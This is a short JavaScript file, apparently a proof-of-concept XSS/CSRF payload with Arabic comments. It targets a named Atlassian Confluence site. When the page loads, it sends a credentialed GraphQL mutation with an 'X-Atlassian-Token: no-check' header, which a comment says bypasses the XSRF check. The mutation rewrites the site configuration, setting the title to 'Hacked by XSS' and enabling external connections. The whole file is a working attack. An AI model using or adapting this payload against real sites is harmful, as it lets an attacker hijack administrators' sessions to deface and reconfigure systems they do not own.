function loadDoc1() {
  var xhttp = new XMLHttpRequest();
  
  // المسار الصحيح يبدأ بـ /wiki/
  var url = "https://anshall.atlassian.net/wiki/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";

  xhttp.open("POST", url, true);

  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");
  
  // إضافة هذا الرأس مهم جداً لتجاوز فحص XSRF في Atlassian
  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");

  xhttp.withCredentials = true;

  var data = JSON.stringify([{
    "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
    "variables": {
      "siteConfigInput": {
        "siteTitle": "Hacked by XSS", 
        "customContactMessage": "xxxx",
        "isContactAdministratorsFormEnabled": true,
        "siteHomePage": "Confluence Home",
        "isEditorConversionForSiteEnabled": true,
        "isEditorFullWidthEnabled": false,
        "isEmailNotificationEnabled": true,
        "isPushNotificationEnabled": true,
        "isLikesEnabled": true,
        "timeFormat": "h:mm a",
        "dateTimeFormat": "MMM dd, yyyy HH:mm",
        "dateFormat": "MMM dd, yyyy",
        "longNumberFormat": "###############",
        "decimalNumberFormat": "###############.##########",
        "maxAttachmentSize": 104857600,
        "maxNumberOfAttachmentsPerUpload": 6,
        "isExternalConnectionsEnabled": true,
        "connectionTimeout": 10000,
        "socketTimeout": 10000,
        "globalDefaultLocale": "en_US",
        "indexingLanguage": "english"
      }
    },
    "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("New Status: " + this.status);
      console.log("Response: " + this.responseText);
    }
  };

  xhttp.send(data);
}

window.onload = loadDoc1;
